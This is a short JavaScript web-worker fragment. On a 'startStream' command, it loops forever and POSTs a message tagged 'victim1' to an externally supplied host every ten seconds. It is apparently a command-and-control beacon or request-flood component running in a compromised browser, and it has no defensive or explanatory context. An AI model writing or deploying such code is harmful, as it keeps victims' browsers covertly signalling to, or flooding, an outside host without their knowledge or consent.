self.addEventListener('message', async e => {
    if (e.data.cmd === 'startStream') {
      while (true) {
        await fetch(e.data.target + '/ping', {
          method: 'POST',
          body: JSON.stringify({ id: 'victim1', data: 'ping' })
        });
        await new Promise(resolve => setTimeout(resolve, 10000));
      }
    }
  });
  